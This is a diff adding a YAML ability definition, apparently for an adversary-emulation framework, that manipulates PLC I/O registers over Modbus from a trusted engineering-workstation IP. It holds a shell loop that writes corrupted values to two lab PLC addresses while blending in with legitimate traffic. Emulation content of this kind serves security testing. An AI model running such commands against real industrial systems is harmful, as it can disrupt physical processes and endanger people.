@@ -1,0 +1,23 @@
+---
+
+- id: e5f6a7b8-5555-5555-5555-000000000004
+  name: Manipulate PLC I/O Image from Trusted EWS
+  description: |
+    Write corrupted values to the PLC's input registers from the
+    EWS IP address (192.168.95.5). Since the EWS is a legitimate
+    ICS host, Modbus writes from this IP are difficult to
+    distinguish from normal engineering operations.
+  tactic: inhibit-response-function
+  technique_id: T0835
+  technique_name: Manipulate I/O Image
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      for i in $(seq 1 30); do
+        ./modbus_cli 192.168.95.12 --port 502 write_r 1 0;
+        ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535;
+        sleep 0.2;
+      done
+    payloads:
+    - modbus_cli
